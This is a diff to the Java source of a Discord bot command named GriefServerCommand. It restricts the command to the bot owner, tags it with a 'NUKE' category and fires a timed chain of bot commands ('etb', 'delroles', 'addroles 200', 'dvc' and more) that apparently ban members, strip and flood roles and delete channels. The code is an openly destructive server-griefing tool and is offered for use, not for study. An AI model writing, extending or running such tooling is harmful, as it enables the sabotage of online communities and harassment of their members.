@@ -12,9 +12,13 @@ public class GriefServerCommand implements ICommand {
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
 
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
+            return;
+        }
+
         int i = 1;
 
-             event.getChannel().sendMessage(Core.PREFIX + "banwave").queueAfter(i++, TimeUnit.SECONDS);
+             event.getChannel().sendMessage(Core.PREFIX + "etb").queueAfter(i++, TimeUnit.SECONDS);
             event.getChannel().sendMessage(Core.PREFIX + "delroles").queue();
             event.getChannel().sendMessage(Core.PREFIX + "addroles 200").queueAfter(i++, TimeUnit.SECONDS);
             event.getChannel().sendMessage(Core.PREFIX + "dvc").queueAfter(i++, TimeUnit.SECONDS);
@@ -44,5 +48,10 @@ public class GriefServerCommand implements ICommand {
     @Override
     public String[] getAlias() {
         return new String[0];
+    }
+
+     @Override
+    public Category getCategory() {
+        return Category.NUKE;
     }
 }
